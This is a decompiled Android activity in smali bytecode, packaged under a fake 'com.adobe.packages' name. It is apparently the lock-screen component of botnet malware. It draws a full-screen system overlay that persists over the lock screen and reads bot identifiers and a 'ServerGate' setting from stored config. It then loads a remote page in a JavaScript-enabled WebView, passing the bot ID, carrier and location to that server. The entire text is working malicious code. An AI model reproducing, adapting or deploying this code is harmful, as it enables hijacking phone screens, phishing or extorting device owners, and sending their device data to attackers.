.class public Lcom/adobe/packages/LCK;
.super Landroid/app/Activity;
.source "LCK.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/adobe/packages/LCK$wc;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 31
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/adobe/packages/LCK;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 119
    invoke-direct {p0, p1}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private getData(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;

    .prologue
    .line 121
    const-string v4, ""

    .line 124
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p0, p1}, Lcom/adobe/packages/LCK;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 126
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 127
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 128
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 129
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 130
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 132
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 136
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 137
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 144
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 133
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 140
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 141
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 111
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 112
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 113
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 117
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 115
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 22
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 38
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 41
    const-string v3, "connectivity"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/packages/LCK;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Landroid/net/ConnectivityManager;

    .line 42
    .local v14, "cm":Landroid/net/ConnectivityManager;
    const-string v3, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/packages/LCK;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    check-cast v17, Landroid/telephony/TelephonyManager;

    .line 43
    .local v17, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v14}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v16

    .line 46
    .local v16, "netInfo":Landroid/net/NetworkInfo;
    const/4 v3, 0x1

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/packages/LCK;->requestWindowFeature(I)Z

    .line 47
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/packages/LCK;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/16 v4, 0x400

    .line 48
    const/16 v21, 0x400

    .line 47
    move/from16 v0, v21

    invoke-virtual {v3, v4, v0}, Landroid/view/Window;->setFlags(II)V

    .line 49
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/packages/LCK;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/high16 v4, 0x80000

    invoke-virtual {v3, v4}, Landroid/view/Window;->addFlags(I)V

    .line 50
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/packages/LCK;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/16 v4, 0x80

    invoke-virtual {v3, v4}, Landroid/view/Window;->addFlags(I)V

    .line 53
    new-instance v2, Landroid/view/WindowManager$LayoutParams;

    .line 54
    const/4 v3, -0x1

    const/4 v4, -0x1

    .line 55
    const/16 v5, 0x7d3

    .line 56
    const/high16 v6, 0x40000

    .line 57
    const/4 v7, -0x3

    .line 53
    invoke-direct/range {v2 .. v7}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 59
    .local v2, "params":Landroid/view/WindowManager$LayoutParams;
    const-string v3, "window"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/packages/LCK;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v18

    check-cast v18, Landroid/view/WindowManager;

    .line 60
    .local v18, "wm":Landroid/view/WindowManager;
    const-string v3, "layout_inflater"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/packages/LCK;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Landroid/view/LayoutInflater;

    .line 61
    .local v15, "inflater":Landroid/view/LayoutInflater;
    const v3, 0x7f030007

    const/4 v4, 0x0

    invoke-virtual {v15, v3, v4}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v20

    .line 63
    .local v20, "zLock":Landroid/view/View;
    move-object/from16 v0, v18

    move-object/from16 v1, v20

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 66
    const-string v3, "BotID"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 67
    .local v6, "BotID":Ljava/lang/String;
    const-string v3, "BotNetwork"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, " "

    const-string v21, "_"

    move-object/from16 v0, v21

    invoke-virtual {v3, v4, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    .line 68
    .local v7, "BotNetwork":Ljava/lang/String;
    const-string v3, "BotLocation"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 70
    .local v8, "BotLocation":Ljava/lang/String;
    const-string v3, "Reich_ServerGate"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 71
    .local v12, "Reich_ServerGate":Ljava/lang/String;
    const-string v3, "BotVer"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 72
    .local v10, "BotVer":Ljava/lang/String;
    sget-object v13, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 73
    .local v13, "SDK":Ljava/lang/String;
    const-string v3, "BotPrefix"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 75
    .local v9, "BotPrefix":Ljava/lang/String;
    const v3, 0x7f09001d

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/webkit/WebView;

    .line 76
    .local v5, "lending":Landroid/webkit/WebView;
    const v3, 0x7f09001e

    move-object/from16 v0, v20

    invoke-virtual {v0, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/Button;

    .line 77
    .local v11, "Check":Landroid/widget/Button;
    invoke-virtual {v5}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v19

    .line 78
    .local v19, "ws":Landroid/webkit/WebSettings;
    const/4 v3, 0x1

    move-object/from16 v0, v19

    invoke-virtual {v0, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 79
    const/4 v3, 0x0

    move-object/from16 v0, v19

    invoke-virtual {v0, v3}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 80
    const/4 v3, 0x0

    move-object/from16 v0, v19

    invoke-virtual {v0, v3}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 81
    const/4 v3, 0x1

    invoke-virtual {v5, v3}, Landroid/webkit/WebView;->setScrollContainer(Z)V

    .line 82
    new-instance v3, Lcom/adobe/packages/LCK$wc;

    const/4 v4, 0x0

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v4}, Lcom/adobe/packages/LCK$wc;-><init>(Lcom/adobe/packages/LCK;Lcom/adobe/packages/LCK$wc;)V

    invoke-virtual {v5, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 83
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "lending"

    move-object/from16 v0, p0

    invoke-direct {v0, v4}, Lcom/adobe/packages/LCK;->getData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "?botid="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&network="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&location="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v3}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 84
    const-string v3, "c"

    const-string v4, "*"

    invoke-virtual/range {p0 .. p0}, Lcom/adobe/packages/LCK;->getApplicationContext()Landroid/content/Context;

    move-result-object v21

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-direct {v0, v3, v4, v1}, Lcom/adobe/packages/LCK;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 86
    new-instance v3, Lcom/adobe/packages/LCK$1;

    move-object/from16 v4, p0

    invoke-direct/range {v3 .. v8}, Lcom/adobe/packages/LCK$1;-><init>(Lcom/adobe/packages/LCK;Landroid/webkit/WebView;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v11, v3}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 103
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 106
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 107
    return-void
.end method
